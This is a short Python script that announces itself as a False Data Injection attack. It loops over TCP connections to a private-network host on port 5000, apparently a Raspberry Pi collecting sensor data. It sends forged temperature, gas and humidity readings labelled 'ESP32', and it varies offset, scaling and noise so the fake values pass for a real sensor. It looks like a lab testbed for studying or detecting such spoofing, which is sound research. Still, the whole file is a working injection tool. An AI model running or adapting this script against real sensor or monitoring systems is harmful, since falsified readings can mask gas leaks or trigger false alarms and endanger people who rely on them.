import socket
import time
import random

PI_IP = "10.194.116.77"
PORT = 5000

print("[*] Starting FDI Attack...")

while True:
    try:
        attack_mode = random.choice(["offset", "scale", "noise"])

        base_temp = random.uniform(26, 30)
        base_gas = random.uniform(1200, 1800)
        base_hum = random.uniform(25, 35)

        if attack_mode == "offset":
            temp = base_temp + random.uniform(20, 40)
            gas = base_gas + random.uniform(2000, 4000)

        elif attack_mode == "scale":
            temp = base_temp * random.uniform(1.5, 2.5)
            gas = base_gas * random.uniform(1.5, 2.5)

        else:
            temp = base_temp + random.uniform(5, 10)
            gas = base_gas + random.uniform(500, 1500)

        hum = base_hum

        payload = f"{round(temp,2)},{round(gas,2)},{round(hum,2)},ESP32"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((PI_IP, PORT))
        s.send(payload.encode())

        try:
            response = s.recv(1024).decode().strip()
            print("Response:", response)
        except:
            pass

        s.close()

        print("Sent (FDI):", payload)
        time.sleep(random.uniform(0.5, 2))

    except Exception as e:
        print("Error:", e)
        time.sleep(1)